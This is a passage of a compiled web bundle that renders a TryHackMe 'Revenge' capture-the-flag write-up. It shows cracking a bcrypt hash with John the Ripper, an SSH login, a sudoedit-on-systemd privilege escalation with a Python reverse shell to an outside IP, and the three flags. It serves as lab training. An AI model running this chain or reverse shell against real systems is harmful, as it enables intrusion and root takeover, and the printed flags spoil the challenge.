/usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 256 for all loaded hashes\nWill run 2 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, almost any other key for status\nAlmost done: Processing the remaining buffered candidate passwords, if any.\nProceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist\ninuyasha         (?)\n1g 0:00:00:07 DONE 2/3 (2020-10-18 22:04) 0.1394g/s 296.2p/s 296.2c/s 296.2C/s eduardo..50cent\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Revenge$ ssh server-admin@10.10.232.228\nThe authenticity of host '10.10.232.228 (10.10.232.228)' can't be established.\nECDSA key fingerprint is SHA256:p6l0aKeIJlyHmiqZxt/pRvjb++LAjF9jTDp4ZkSCpOk.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.232.228' (ECDSA) to the list of known hosts.\nserver-admin@10.10.232.228's password:\nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n System information disabled due to load higher than 1.0\n\n\n8 packages can be updated.\n0 updates are security updates.\n\n\n################################################################################\n#                        Ducky Inc. Web Server 00080012                        #\n#            This server is for authorized Ducky Inc. employees only           #\n#                  All actiions are being monitored and recorded               #\n#                    IP and MAC addresses have been logged                     #\n################################################################################\nLast login: Wed Aug 12 20:09:36 2020 from 192.168.86.65\nserver-admin@duckyinc:~$ ls\nflag2.txt\nserver-admin@duckyinc:~$ cat flag2.txt\nthm{4lm0st_th3re}\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"server-admin@duckyinc:~$ sudo -l\n[sudo] password for server-admin:\nMatching Defaults entries for server-admin on duckyinc:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser server-admin may run the following commands on duckyinc:\n    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit\n        /etc/systemd/system/duckyinc.service\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'/usr/bin/python3 -c \'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"# ls /root\nflag3.txt\n# cat /root/flag3.txt\nthm{m1ss10n_acc0mpl1sh3d}\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"flag1")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"thm{br3ak1ng_4nd_3nt3r1ng}")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"flag2")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"thm{4lm0st_th3re}")),(0,a.kt)("ol",{start:3},(0,a.kt)("li",{parentName:"ol"},"flag3")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"thm{m1ss10n_acc0mpl1sh3d}")))}p.isMDXComponent=!0}}]);